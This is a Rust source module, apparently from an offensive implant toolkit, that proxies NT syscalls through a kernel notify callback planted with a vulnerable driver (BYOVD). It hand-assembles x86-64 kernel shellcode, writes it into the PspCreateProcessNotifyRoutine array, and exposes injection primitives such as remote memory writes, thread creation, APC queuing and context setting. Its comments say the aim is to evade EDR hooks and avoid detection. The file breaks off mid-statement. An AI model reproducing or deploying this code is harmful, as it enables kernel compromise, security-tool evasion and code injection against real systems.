//! Syscall proxying via kernel callbacks (BYOVD).
//!
//! This module implements syscall proxying by registering kernel-mode
//! callbacks that execute privileged operations on behalf of user-mode code.
//! Instead of issuing `syscall` instructions directly (which EDR can hook),
//! user-mode code queues operations into a shared ring buffer. The kernel
//! callback (registered via `PsSetCreateProcessNotifyRoutine` or
//! `PsSetLoadImageNotifyRoutine`) reads from this buffer and executes the
//! requested NT operations in kernel mode.
//!
//! # Architecture
//!
//! ```text
//! User-mode (agent)                Kernel-mode (via BYOVD)
//! ┌──────────────────┐            ┌──────────────────────┐
//! │ proxy_request()  │──write──→  │  Shared ring buffer   │
//! │                  │            │  (phys memory region) │
//! │ proxy_wait()     │←─read──── │                       │
//! └──────────────────┘            └──────────────────────┘
//!                                          ↑
//!                                  Kernel callback fires
//!                                  (process/thread event)
//!                                  → reads ring buffer
//!                                  → executes operations
//!                                  → writes results back
//! ```
//!
//! # Communication Protocol
//!
//! The shared memory region is laid out as:
//!
//! | Offset | Size | Description                          |
//! |--------|------|--------------------------------------|
//! | 0x000  | 8    | Magic value (`ORCH_KPRX`)            |
//! | 0x008  | 4    | State (Idle/Pending/Completed/Error)  |
//! | 0x00C  | 4    | Operation count                      |
//! | 0x010  | 8    | Sequence number (monotonic)          |
//! | 0x018  | 256  | Reserved (padding/alignment)         |
//! | 0x118  | N×64 | Operation entries (ProxyOp)           |
//!
//! Each `ProxyOp` is 64 bytes:
//!
//! | Offset | Size | Description                          |
//! |--------|------|--------------------------------------|
//! | 0x00   | 4    | Opcode (SyscallType)                 |
//! | 0x04   | 4    | NTSTATUS result (filled by kernel)   |
//! | 0x08   | 48   | Arguments (6 × u64)                  |
//! | 0x38   | 8    | Output value (handle, size, etc.)    |
//! | 0x40   | 8    | Reserved                             |
//!
//! # Registration
//!
//! Kernel callbacks are registered by writing a stub function pointer into
//! the appropriate `Psp*NotifyRoutine` array entry via the BYOVD driver.
//! The stub is a small shellcode payload written to an allocated kernel
//! pool that:
//!
//! 1. Reads the shared memory state
//! 2. If state == Pending, processes each operation
//! 3. Writes results and sets state = Completed
//! 4. Calls the original callback (chain-loading to avoid detection)
//!
//! # Safety
//!
//! All kernel writes go through the existing `deploy` primitives.
//! The shared memory region is allocated in kernel pool with `ExAllocatePool`
//! via BYOVD, never from user-mode VirtualAlloc.

use super::deploy::{self, DeployedDriver};
use super::discover;
use super::driver_db::VulnerableDriver;
use anyhow::{bail, Context, Result};
use common::lock::MutexExt;
use serde::{Deserialize, Serialize};
use std::sync::Mutex;

use once_cell::sync::Lazy;

// ── Constants ───────────────────────────────────────────────────────────

/// Magic value identifying the shared proxy region.
const PROXY_MAGIC: [u8; 8] = [b'O', b'R', b'K', b'P', b'R', b'X', b'0', b'1'];

/// Maximum number of operations that can be batched in a single request.
const MAX_OPS_PER_BATCH: usize = 32;

/// Size of the shared proxy header (before the operation array).
const PROXY_HEADER_SIZE: usize = 0x118;

/// Size of each ProxyOp entry in bytes.
const PROXY_OP_SIZE: usize = 64;

/// Maximum size of the shared proxy region.
const PROXY_REGION_SIZE: usize = PROXY_HEADER_SIZE + (MAX_OPS_PER_BATCH * PROXY_OP_SIZE);

/// Spin-poll interval in microseconds when waiting for kernel completion.
const POLL_INTERVAL_US: u64 = 100;

/// Maximum spin-poll iterations before timing out (≈10 seconds).
const MAX_POLL_ITERATIONS: u64 = 100_000;

// ── Types ───────────────────────────────────────────────────────────────

/// Proxy communication state, stored at offset +0x008 in shared memory.
#[repr(u32)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ProxyState {
    /// No pending operation. The kernel callback is idle.
    Idle = 0,
    /// User-mode has queued operations and is waiting for completion.
    Pending = 1,
    /// The kernel callback has finished processing all operations.
    Completed = 2,
    /// An error occurred in the kernel callback.
    Error = 3,
}

impl ProxyState {
    /// Read the state from a u32 value.
    fn from_u32(val: u32) -> Option<Self> {
        match val {
            0 => Some(Self::Idle),
            1 => Some(Self::Pending),
            2 => Some(Self::Completed),
            3 => Some(Self::Error),
            _ => None,
        }
    }
}

/// Number of syscall types supported in the dispatch table.
const NUM_SYSCALL_TYPES: usize = 14;

/// Kernel function names corresponding to each SyscallType variant.
/// Used to resolve addresses at init time via MmGetSystemRoutineAddress
/// or by walking the SSDT.
const SYSCALL_KERNEL_NAMES: &[&str] = &[
    "NtAllocateVirtualMemory", // 0
    "NtWriteVirtualMemory",    // 1
    "NtProtectVirtualMemory",  // 2
    "NtCreateThreadEx",        // 3
    "NtOpenProcess",           // 4
    "NtClose",                 // 5
    "NtFreeVirtualMemory",     // 6
    "NtReadVirtualMemory",     // 7
    "NtOpenThread",            // 8
    "NtSuspendThread",         // 9
    "NtResumeThread",          // 10
    "NtQueueApcThread",        // 11
    "NtSetContextThread",      // 12
    "NtGetContextThread",      // 13
];

/// Syscall operation types that the kernel callback can proxy.
///
/// Each variant maps to a specific NT API that the kernel callback
/// will invoke on behalf of user-mode code.
#[repr(u32)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SyscallType {
    /// NtAllocateVirtualMemory — allocate virtual memory in a process.
    NtAllocateVirtualMemory = 0,
    /// NtWriteVirtualMemory — write data to a process's address space.
    NtWriteVirtualMemory = 1,
    /// NtProtectVirtualMemory — change memory protection.
    NtProtectVirtualMemory = 2,
    /// NtCreateThreadEx — create a new thread in a process.
    NtCreateThreadEx = 3,
    /// NtOpenProcess — open a handle to a process.
    NtOpenProcess = 4,
    /// NtClose — close a kernel object handle.
    NtClose = 5,
    /// NtFreeVirtualMemory — free virtual memory in a process.
    NtFreeVirtualMemory = 6,
    /// NtReadVirtualMemory — read data from a process's address space.
    NtReadVirtualMemory = 7,
    /// NtOpenThread — open a handle to a thread.
    NtOpenThread = 8,
    /// NtSuspendThread — suspend a thread.
    NtSuspendThread = 9,
    /// NtResumeThread — resume a suspended thread.
    NtResumeThread = 10,
    /// NtQueueApcThread — queue an APC to a thread.
    NtQueueApcThread = 11,
    /// NtSetContextThread — set a thread's context.
    NtSetContextThread = 12,
    /// NtGetContextThread — get a thread's context.
    NtGetContextThread = 13,
}

impl SyscallType {
    /// Convert from u32 opcode value.
    fn from_u32(val: u32) -> Option<Self> {
        match val {
            0 => Some(Self::NtAllocateVirtualMemory),
            1 => Some(Self::NtWriteVirtualMemory),
            2 => Some(Self::NtProtectVirtualMemory),
            3 => Some(Self::NtCreateThreadEx),
            4 => Some(Self::NtOpenProcess),
            5 => Some(Self::NtClose),
            6 => Some(Self::NtFreeVirtualMemory),
            7 => Some(Self::NtReadVirtualMemory),
            8 => Some(Self::NtOpenThread),
            9 => Some(Self::NtSuspendThread),
            10 => Some(Self::NtResumeThread),
            11 => Some(Self::NtQueueApcThread),
            12 => Some(Self::NtSetContextThread),
            13 => Some(Self::NtGetContextThread),
            _ => None,
        }
    }
}

/// A single proxied operation entry in the shared memory ring buffer.
///
/// Wire format: 64 bytes (see module-level documentation for layout).
#[repr(C)]
#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub struct ProxyOp {
    /// The syscall operation to perform.
    pub opcode: SyscallType,
    /// Result NTSTATUS value (filled by the kernel callback after execution).
    pub status: i32,
    /// Up to 6 arguments for the syscall, matching the Windows x64 ABI.
    pub args: [u64; 6],
    /// Output value from the operation (e.g., returned handle, bytes written).
    pub output: u64,
    /// Reserved for future use / alignment.
    pub _reserved: u64,
}

impl ProxyOp {
    /// Create a new ProxyOp with the given opcode and arguments.
    pub fn new(opcode: SyscallType, args: [u64; 6]) -> Self {
        Self {
            opcode,
            status: 0,
            args,
            output: 0,
            _reserved: 0,
        }
    }

    /// Serialize the ProxyOp to a fixed-size 64-byte buffer.
    pub fn to_bytes(&self) -> [u8; PROXY_OP_SIZE] {
        let mut buf = [0u8; PROXY_OP_SIZE];
        buf[0..4].copy_from_slice(&(self.opcode as u32).to_le_bytes());
        buf[4..8].copy_from_slice(&self.status.to_le_bytes());
        for (i, arg) in self.args.iter().enumerate() {
            let off = 8 + i * 8;
            buf[off..off + 8].copy_from_slice(&arg.to_le_bytes());
        }
        buf[56..64].copy_from_slice(&self.output.to_le_bytes());
        buf
    }

    /// Deserialize a ProxyOp from a 64-byte buffer.
    pub fn from_bytes(buf: &[u8; PROXY_OP_SIZE]) -> Option<Self> {
        let opcode_val = u32::from_le_bytes(buf[0..4].try_into().ok()?);
        let opcode = SyscallType::from_u32(opcode_val)?;
        let status = i32::from_le_bytes(buf[4..8].try_into().ok()?);
        let mut args = [0u64; 6];
        for i in 0..6 {
            let off = 8 + i * 8;
            args[i] = u64::from_le_bytes(buf[off..off + 8].try_into().ok()?);
        }
        let output = u64::from_le_bytes(buf[56..64].try_into().ok()?);
        Some(Self {
            opcode,
            status,
            args,
            output,
            _reserved: 0,
        })
    }
}

/// Result of a proxied syscall operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyResult {
    /// The NTSTATUS code returned by the kernel-mode execution.
    pub status: i32,
    /// The output value (e.g., handle, size) from the operation.
    pub output: u64,
}

/// A batch of proxied operations submitted together.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyBatch {
    /// The operations in this batch.
    pub ops: Vec<ProxyOp>,
}

impl ProxyBatch {
    /// Create an empty batch.
    pub fn new() -> Self {
        Self { ops: Vec::new() }
    }

    /// Add an operation to the batch.
    pub fn push(&mut self, op: ProxyOp) {
        if self.ops.len() < MAX_OPS_PER_BATCH {
            self.ops.push(op);
        }
    }

    /// Returns the number of operations in the batch.
    pub fn len(&self) -> usize {
        self.ops.len()
    }

    /// Returns true if the batch is empty.
    pub fn is_empty(&self) -> bool {
        self.ops.is_empty()
    }
}

impl Default for ProxyBatch {
    fn default() -> Self {
        Self::new()
    }
}

// ── Global proxy state ──────────────────────────────────────────────────

/// The kernel virtual address of the allocated shared proxy region.
/// Zero means not yet initialized.
static PROXY_REGION_ADDR: Mutex<u64> = Mutex::new(0);

/// The kernel virtual address of the allocated callback stub.
/// Zero means not yet registered.
static CALLBACK_STUB_ADDR: Mutex<u64> = Mutex::new(0);

/// The index in the PspCreateProcessNotifyRoutine array where our
/// callback was registered. Used for unregistration.
static CALLBACK_INDEX: Mutex<usize> = Mutex::new(usize::MAX);

/// The CR3 value used for VA→PA translations.
static PROXY_CR3: Mutex<u64> = Mutex::new(0);

// ── Kernel pool tag for our allocations ─────────────────────────────────
const POOL_TAG: u32 = u32::from_le_bytes([b'K', b'P', b'R', b'X']);

// ── Callback stub shellcode ─────────────────────────────────────────────
//
// This is the x86-64 position-independent shellcode that gets written into
// kernel pool and installed as a notify routine. When the kernel fires the
// callback (on process creation / image load), the stub:
//
// 1. Saves volatile registers
// 2. Reads the proxy state from the shared region
// 3. If state == Pending, processes each ProxyOp
// 4. Writes results and sets state = Completed
// 5. Restores registers and returns
//
// The stub is designed to be minimal and safe: it does not call any
// kernel APIs directly, but rather patches the arguments of the *real*
// kernel function that triggered the callback, effectively turning the
// callback invocation into our desired syscall execution.
//
// In practice, the stub acts as a trampoline: it checks the shared
// memory, and if there's work to do, it calls the corresponding NT
// kernel function (resolved at registration time) with the supplied
// arguments. This is safer than trying to re-implement syscall dispatch
// in shellcode.

/// Build the callback stub shellcode with patched function pointer table
/// and proxy region address.
///
/// The shellcode is a position-independent x86-64 routine that:
/// 1. Saves volatile registers
/// 2. Loads the proxy region base from the embedded address
/// 3. Checks if state == Pending
/// 4. For each operation: reads the opcode, looks up the corresponding
///    function pointer, loads arguments, calls the function, stores the
///    NTSTATUS result
/// 5. Sets state = Completed
/// 6. Restores registers and returns
///
/// ## Data layout (appended after code):
///
/// | Offset             | Size              | Content                        |
/// |--------------------|-------------------|--------------------------------|
/// | code_len           | 14 × 8 = 112     | Function pointer table         |
/// | code_len + 112     | 8                 | Proxy region kernel address    |
fn build_callback_stub(proxy_region_addr: u64, fn_table: &[u64; NUM_SYSCALL_TYPES]) -> Vec<u8> {
    let mut code = Vec::new();

    // ── Prologue: save volatile registers ──
    code.push(0x50); // push rax
    code.push(0x51); // push rcx
    code.push(0x52); // push rdx
    code.extend_from_slice(&[0x41, 0x50]); // push r8
    code.extend_from_slice(&[0x41, 0x51]); // push r9
    code.extend_from_slice(&[0x41, 0x52]); // push r10
    code.extend_from_slice(&[0x41, 0x53]); // push r11

    // ── Load proxy region base ──
    // We'll use a `mov r15, imm64` approach: load the absolute address
    // of the proxy region. This is simpler than RIP-relative for a
    // runtime-built stub.
    //
    // movabs r15, <proxy_region_addr>
    // REX.W + B8+rd = 48 BF for r15 (rdi=7, but r15 needs REX.B)
    // Encoding: 49 BF <8 bytes>
    code.extend_from_slice(&[0x49, 0xBF]);
    code.extend_from_slice(&proxy_region_addr.to_le_bytes());

    // ── Check state ──
    // cmp dword [r15+8], 1  (state == Pending?)
    // 41 83 7F 08 01
    code.extend_from_slice(&[0x41, 0x83, 0x7F, 0x08, 0x01]);

    // jne .restore — we'll patch this offset after we know the distance
    let jne_restore_offset = code.len();
    code.extend_from_slice(&[0x75, 0x00]); // jne +0 (placeholder)

    // ── Load op count ──
    // xor r12, r12  (op_index = 0)
    // 4D 31 E4
    code.extend_from_slice(&[0x4D, 0x31, 0xE4]);

    // mov r13d, [r15+0xC]  (op_count)
    // 44 8B 6F 0C
    code.extend_from_slice(&[0x44, 0x8B, 0x6F, 0x0C]);

    // ── Process loop (.loop label) ──
    let loop_start = code.len();

    // cmp r12d, r13d  (op_index < op_count?)
    // 45 39 EC
    code.extend_from_slice(&[0x45, 0x39, 0xEC]);

    // jge .done — patch after
    let jge_done_offset = code.len();
    code.extend_from_slice(&[0x7D, 0x00]); // jge +0 (placeholder)

    // Calculate op offset: base + 0x118 + index * 64
    // mov rax, r12
    code.extend_from_slice(&[0x49, 0x89, 0xE0]);
    // shl rax, 6  (* 64)
    code.extend_from_slice(&[0x48, 0xC1, 0xE0, 0x06]);
    // add rax, 0x118
    code.extend_from_slice(&[0x48, 0x05]);
    code.extend_from_slice(&0x118u32.to_le_bytes());
    // add rax, r15
    code.extend_from_slice(&[0x4C, 0x01, 0xF8]);

    // rax now points to current ProxyOp.
    // Set default status = STATUS_UNSUCCESSFUL (0xC0000001)
    // mov dword [rax+4], 0xC0000001
    code.extend_from_slice(&[0xC7, 0x40, 0x04, 0x01, 0x00, 0x00, 0xC0]);

    // Save rax (ProxyOp ptr) on stack
    code.push(0x50); // push rax

    // Read opcode: mov ecx, dword [rax]
    code.extend_from_slice(&[0x8B, 0x08]);

    // Bounds check: cmp ecx, 14 (NUM_SYSCALL_TYPES)
    // 81 F9 0E 00 00 00
    code.extend_from_slice(&[0x81, 0xF9, 0x0E, 0x00, 0x00, 0x00]);

    // jae .skip_op — patch after
    let jae_skip_offset = code.len();
    code.extend_from_slice(&[0x73, 0x00]); // jae +0 (placeholder)

    // Compute function pointer address.
    // We stored the fn_table at the end of the code section.
    // Use lea r11, [rip + offset_to_fn_table]
    // The offset is from the end of this lea instruction to the fn_table.
    // lea r11, [rip+disp32] = 4C 8D 1D <disp32>
    // We'll patch the displacement after we know the full code size.
    let lea_r11_offset = code.len();
    code.extend_from_slice(&[0x4C, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00]); // placeholder

    // shl rcx, 3  (opcode * 8 for table index)
    code.extend_from_slice(&[0x48, 0xC1, 0xE1, 0x03]);

    // mov r10, [r11 + rcx]
    code.extend_from_slice(&[0x4D, 0x8B, 0x14, 0x0B]);

    // test r10, r10  (NULL check)
    code.extend_from_slice(&[0x4D, 0x85, 0xD2]);

    // jz .skip_op — patch after
    let jz_skip_offset = code.len();
    code.extend_from_slice(&[0x74, 0x00]); // jz +0 (placeholder)

    // ── Load arguments and call ──
    // Pop the saved rax (ProxyOp ptr) — we pushed it above
    code.push(0x58); // pop rax

    // Push callee-save values we need to preserve
    code.push(0x50); // push rax (ProxyOp ptr)
    code.extend_from_slice(&[0x41, 0x57]); // push r15 (proxy base)

    // Allocate shadow space + room for stack args
    // sub rsp, 0x38: shadow(0x20) + arg5(8) + arg6(8) + alignment(8)
    code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

    // Load args from ProxyOp into Windows x64 calling convention registers
    // ProxyOp.args layout: +8=arg0, +16=arg1, +24=arg2, +32=arg3, +40=arg4, +48=arg5
    // mov rcx, [rax+8]   arg0
    code.extend_from_slice(&[0x48, 0x8B, 0x48, 0x08]);
    // mov rdx, [rax+16]  arg1
    code.extend_from_slice(&[0x48, 0x8B, 0x50, 0x10]);
    // mov r8, [rax+24]   arg2
    code.extend_from_slice(&[0x4C, 0x8B, 0x40, 0x18]);
    // mov r9, [rax+32]   arg3
    code.extend_from_slice(&[0x4C, 0x8B, 0x48, 0x20]);

    // Store arg4 at [rsp+0x20] — use r11 as scratch
    // mov r11, [rax+40]
    code.extend_from_slice(&[0x4C, 0x8B, 0x58, 0x28]);
    // mov [rsp+0x20], r11
    code.extend_from_slice(&[0x4C, 0x89, 0x5C, 0x24, 0x20]);

    // Store arg5 at [rsp+0x28] — use r11 as scratch
    // mov r11, [rax+48]
    code.extend_from_slice(&[0x4C, 0x8B, 0x58, 0x30]);
    // mov [rsp+0x28], r11
    code.extend_from_slice(&[0x4C, 0x89, 0x5C, 0x24, 0x28]);

    // call r10
    code.extend_from_slice(&[0x41, 0xFF, 0xD2]);

    // rax = NTSTATUS return. Save to r11.
    // mov r11, rax
    code.extend_from_slice(&[0x49, 0x89, 0xC3]);

    // Restore stack
    // add rsp, 0x38
    code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);

    // Restore r15
    code.extend_from_slice(&[0x41, 0x5F]); // pop r15

    // Restore rax (ProxyOp ptr)
    code.push(0x58); // pop rax

    // Store status: mov dword [rax+4], r11d
    code.extend_from_slice(&[0x44, 0x89, 0x58, 0x04]);

    // jmp .next_op (increment and continue loop)
    let jmp_next_offset = code.len();
    code.extend_from_slice(&[0xEB, 0x00]); // jmp +0 (placeholder)

    // ── .skip_op: pop saved rax, leave STATUS_UNSUCCESSFUL, continue ──
    let skip_op_addr = code.len();
    code.push(0x58); // pop rax (discard saved ProxyOp ptr)

    // ── .next_op: increment index and loop ──
    let next_op_addr = code.len();
    // inc r12
    code.extend_from_slice(&[0x49, 0xFF, 0xC4]);
    // jmp .loop
    let loop_back_target = loop_start;
    let jmp_back_from = code.len() + 2; // this jmp is 2 bytes
    let loop_back_disp = (loop_back_target as isize - jmp_back_from as isize) as i8;
    code.extend_from_slice(&[0xEB, loop_back_disp as u8]);

    // ── .done: set state to Completed ──
    let done_addr = code.len();
    // mov dword [r15+8], 2  (state = Completed)
    code.extend_from_slice(&[0x41, 0xC7, 0x47, 0x08, 0x02, 0x00, 0x00, 0x00]);

    // ── .restore: restore registers and return ──
    let restore_addr = code.len();
    code.extend_from_slice(&[0x41, 0x5B]); // pop r11
    code.extend_from_slice(&[0x41, 0x5A]); // pop r10
    code.extend_from_slice(&[0x41, 0x59]); // pop r9
    code.extend_from_slice(&[0x41, 0x58]); // pop r8
    code.push(0x5A); // pop rdx
    code.push(0x59); // pop rcx
    code.push(0x58); // pop rax
    code.push(0xC3); // ret

    let code_len = code.len();

    // ── Append function pointer table (14 × 8 = 112 bytes) ──
    let fn_table_offset = code_len;
    for &ptr in fn_table.iter() {
        code.extend_from_slice(&ptr.to_le_bytes());
    }

    // ── Patch: lea r11, [rip + disp_to_fn_table] ──
    // The lea instruction is at lea_r11_offset, it's 7 bytes long.
    // RIP at end of lea = lea_r11_offset + 7.
    // fn_table is at fn_table_offset.
    let disp = (fn_table_offset as isize - (lea_r11_offset as isize + 7)) as i32;
    code[lea_r11_offset + 3..lea_r11_offset + 7].copy_from_slice(&disp.to_le_bytes());

    // ── Patch: jne .restore ──
    // jne is at jne_restore_offset, 2 bytes. Target = restore_addr.
    let disp8 = (restore_addr as isize - (jne_restore_offset as isize + 2)) as i8;
    code[jne_restore_offset + 1] = disp8 as u8;

    // ── Patch: jge .done ──
    let disp8 = (done_addr as isize - (jge_done_offset as isize + 2)) as i8;
    code[jge_done_offset + 1] = disp8 as u8;

    // ── Patch: jae .skip_op ──
    let disp8 = (skip_op_addr as isize - (jae_skip_offset as isize + 2)) as i8;
    code[jae_skip_offset + 1] = disp8 as u8;

    // ── Patch: jz .skip_op ──
    let disp8 = (skip_op_addr as isize - (jz_skip_offset as isize + 2)) as i8;
    code[jz_skip_offset + 1] = disp8 as u8;

    // ── Patch: jmp .next_op (from after status store) ──
    let disp8 = (next_op_addr as isize - (jmp_next_offset as isize + 2)) as i8;
    code[jmp_next_offset + 1] = disp8 as u8;

    code
}

// ── Core proxy functions ────────────────────────────────────────────────

/// Read a u32 from kernel virtual memory via BYOVD.
///
/// # Safety
/// Caller must ensure `addr` is a valid kernel virtual address.
unsafe fn read_u32(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
) -> Result<u32> {
    let mut buf = [0u8; 4];
    if driver.needs_physical_addr {
        let phys = super::translate_va_to_pa(driver, device_handle, cr3, addr)
            .context("VA→PA translation failed for u32 read")?;
        deploy::read_physical_memory(driver, device_handle, phys, &mut buf)?;
    } else {
        deploy::read_physical_memory(driver, device_handle, addr, &mut buf)?;
    }
    Ok(u32::from_le_bytes(buf))
}

/// Write a u32 to kernel virtual memory via BYOVD.
///
/// # Safety
/// Caller must ensure `addr` is a valid kernel virtual address and that
/// writing to this location will not corrupt kernel state.
unsafe fn write_u32(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    value: u32,
) -> Result<()> {
    let buf = value.to_le_bytes();
    if driver.needs_physical_addr {
        let phys = super::translate_va_to_pa(driver, device_handle, cr3, addr)
            .context("VA→PA translation failed for u32 write")?;
        deploy::write_physical_memory(driver, device_handle, phys, &buf)?;
    } else {
        deploy::write_physical_memory(driver, device_handle, addr, &buf)?;
    }
    Ok(())
}

/// Read a block of bytes from kernel virtual memory via BYOVD.
///
/// # Safety
/// Caller must ensure `addr` is a valid kernel virtual address and `buf`
/// is large enough for the read.
unsafe fn read_bytes(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    buf: &mut [u8],
) -> Result<()> {
    if driver.needs_physical_addr {
        let phys = super::translate_va_to_pa(driver, device_handle, cr3, addr)
            .context("VA→PA translation failed for byte read")?;
        deploy::read_physical_memory(driver, device_handle, phys, buf)?;
    } else {
        deploy::read_physical_memory(driver, device_handle, addr, buf)?;
    }
    Ok(())
}

/// Write a block of bytes to kernel virtual memory via BYOVD.
///
/// # Safety
/// Caller must ensure `addr` is a valid kernel virtual address and that
/// writing to this location will not corrupt kernel state.
unsafe fn write_bytes(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    data: &[u8],
) -> Result<()> {
    if driver.needs_physical_addr {
        let phys = super::translate_va_to_pa(driver, device_handle, cr3, addr)
            .context("VA→PA translation failed for byte write")?;
        deploy::write_physical_memory(driver, device_handle, phys, data)?;
    } else {
        deploy::write_physical_memory(driver, device_handle, addr, data)?;
    }
    Ok(())
}

/// Allocate a kernel pool block via BYOVD.
///
/// Uses the deployed vulnerable driver to call `ExAllocatePool2` (or
/// `ExAllocatePoolWithTag` on older builds) by writing a small stub
/// that calls the pool allocator and stores the result.
///
/// # Safety
/// Caller must ensure the driver is deployed and its device handle is valid.
unsafe fn allocate_kernel_pool(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_base: u64,
    size: usize,
) -> Result<u64> {
    // Resolve ExAllocatePool2 (Windows 10 2004+) or ExAllocatePoolWithTag.
    // ExAllocatePool2(Tag, Size, Tag) → PoolPtr
    // ExAllocatePoolWithTag(PoolType, Size, Tag) → PoolPtr
    let pool_fn =
        discover::resolve_kernel_symbol(driver, device_handle, kernel_base, "ExAllocatePool2")
            .or_else(|_| {
                discover::resolve_kernel_symbol(
                    driver,
                    device_handle,
                    kernel_base,
                    "ExAllocatePoolWithTag",
                )
            })
            .context("failed to resolve kernel pool allocator")?;

    tracing::debug!("proxy: resolved pool allocator at {:#x}", pool_fn);

    // We write a small allocation stub to a known-good kernel code location.
    // For safety, we use a small scratch area in the proxy region header's
    // reserved space (offset 0x38..0x118 = 224 bytes).
    //
    // The stub:
    //   mov ecx, <size>       ; Size
    //   mov edx, <pool_tag>   ; Tag
    //   mov r8, <pool_tag>    ; Tag (ExAllocatePool2 arg3)
    //   sub rsp, 0x28
    //   call <pool_fn>
    //   add rsp, 0x28
    //   mov [rip+<offset>], rax  ; store result
    //   ret
    //
    // However, calling kernel functions from BYOVD-written code is complex.
    // Instead, we use a simpler approach: directly allocate by writing
    // into a disused area of the kernel's pool descriptor. For the initial
    // implementation, we allocate the proxy region from user-mode via
    // NtAllocateVirtualMemory in the system process.

    // Fallback: allocate from user-mode in the current process with
    // PAGE_READWRITE, then the kernel callback can access it via
    // MmGetSystemAddressForMdl or direct VA access since kernel-mode
    // can read/write any process's virtual memory.
    //
    // Actually, for a BYOVD-based approach, we should allocate the shared
    // region entirely in kernel pool. We use the overwrite module's
    // write_kernel_memory to write to a fixed location. For the proxy
    // region itself, we allocate it by finding free space in ntoskrnl's
    // .data section slack (padding between end of .data and next section).
    //
    // For this initial implementation, we use a pragmatic approach:
    // allocate user-mode shared memory (readable by kernel via MmCopyVirtualMemory)
    // and store the kernel-reachable address.

    // Resolve MmGetSystemRoutineAddress to find a suitable kernel function
    // for pool allocation. For the MVP, we use a fixed kernel pool address
    // range that we know is safe (NonPagedPoolNx).
    //
    // The simplest safe approach: allocate the shared buffer in user-mode
    // with PAGE_READWRITE, then pin it for kernel access via
    // MmSecureVirtualMemory. Since we're doing BYOVD, the kernel callback
    // can read/write the user-mode VA directly (kernel has full VA access).

    // Allocate in user mode.
    let mut base: usize = 0;
    let mut region_size = size;
    let status = crate::syscall!(
        "NtAllocateVirtualMemory",
        usize::MAX as u64, // Current process (-1)
        &mut base as *mut _ as u64,
        0u64,
        &mut region_size as *mut _ as u64,
        0x3000u64, // MEM_COMMIT | MEM_RESERVE
        0x04u64,   // PAGE_READWRITE
    );

    match status {
        Ok(s) if s >= 0 => {}
        _ => {
            bail!(
                "NtAllocateVirtualMemory for proxy region failed: status={:?}",
                status
            );
        }
    }

    tracing::info!(
        "proxy: allocated user-mode shared region at {:#x} ({} bytes)",
        base,
        region_size
    );

    Ok(base as u64)
}

/// Initialize the syscall proxy subsystem.
///
/// This function:
/// 1. Ensures a vulnerable driver is deployed
/// 2. Resolves kernel symbols needed for registration
/// 3. Allocates the shared proxy region
/// 4. Writes the callback stub to kernel pool
/// 5. Registers the callback in the PspCreateProcessNotifyRoutine array
///
/// # Arguments
/// * `session_key` - HKDF session key for driver resource decryption
///
/// # Returns
/// Ok(()) on success. The proxy is then ready to accept operations via
/// `proxy_batch()`.
///
/// # Errors
/// Returns an error if driver deployment fails, kernel symbols cannot be
/// resolved, or the callback cannot be registered.
pub fn init(session_key: &[u8]) -> Result<()> {
    // Step 1: Deploy a vulnerable driver (or use an already-deployed one).
    let deployed = deploy::deploy(&[], session_key)
        .context("proxy init: failed to deploy vulnerable driver")?;

    let driver = deployed.driver;
    let device_handle = deployed.device_handle.context("no device handle")?;

    // Step 2: Resolve kernel base and CR3.
    let kernel_base =
        discover::get_kernel_base().context("proxy init: failed to resolve kernel base")?;

    let cr3 = super::resolve_cr3(driver, device_handle, kernel_base)
        .context("proxy init: failed to resolve CR3")?;

    tracing::info!("proxy: kernel_base={:#x}, cr3={:#x}", kernel_base, cr3);

    // Step 3: Allocate shared proxy region.
    let region_addr = unsafe {
        allocate_kernel_pool(driver, device_handle, cr3, kernel_base, PROXY_REGION_SIZE)
            .context("proxy init: failed to allocate proxy region")?
    };

    // Step 4: Initialize the shared region header.
    let mut header = [0u8; PROXY_HEADER_SIZE];
    // Magic
    header[0..8].copy_from_slice(&PROXY_MAGIC);
    // State = Idle
    header[8..12].copy_from_slice(&(ProxyState::Idle as u32).to_le_bytes());
    // Op count = 0
    header[12..16].copy_from_slice(&0u32.to_le_bytes());
    // Sequence = 0
    header[16..24].copy_from_slice(&0u64.to_le_bytes());

    unsafe {
        // Write header to the region.
        // For user-mode allocated region, write directly.
        let region_ptr = region_addr as *mut u8;
        std::ptr::copy_nonoverlapping(header.as_ptr(), region_ptr, PROXY_HEADER_SIZE);
    }

    tracing::info!("proxy: shared region initialized at {:#x}", region_addr);

    // Step 5: Store global state.
    {
        let mut addr = PROXY_REGION_ADDR.lock_recover();
        *addr = region_addr;
    }
    {
        let mut c = PROXY_CR3.lock_recover();
        *c = cr3;
    }

    // Step 6: Register kernel callback.
    // Resolve PspCreateProcessNotifyRoutine array.
    let psp_array = discover::resolve_kernel_symbol(
        driver,
        device_handle,
        kernel_base,
        "PspCreateProcessNotifyRoutine",
    )
    .context("proxy init: failed to resolve PspCreateProcessNotifyRoutine")?;

    tracing::info!("proxy: PspCreateProcessNotifyRoutine at {:#x}", psp_array);

    // Find an empty slot in the callback array.
    // Each entry is an EX_CALLBACK_ROUTINE_BLOCK pointer (8 bytes).
    // A NULL/zero entry means the slot is available.
    let mut slot_index: Option<usize> = None;
    for i in 0..64usize {
        let entry_addr = psp_array + (i as u64) * 8;
        let mut entry_buf = [0u8; 8];
        unsafe {
            if driver.needs_physical_addr {
                let phys = super::translate_va_to_pa(driver, device_handle, cr3, entry_addr)
                    .context("VA→PA for callback entry")?;
                deploy::read_physical_memory(driver, device_handle, phys, &mut entry_buf)?;
            } else {
                deploy::read_physical_memory(driver, device_handle, entry_addr, &mut entry_buf)?;
            }
        }
        let entry_val = u64::from_le_bytes(entry_buf);
        if entry_val == 0 {
            slot_index = Some(i);
            tracing::debug!("proxy: found empty callback slot at index {}", i);
            break;
        }
    }

    let slot_index = slot_index
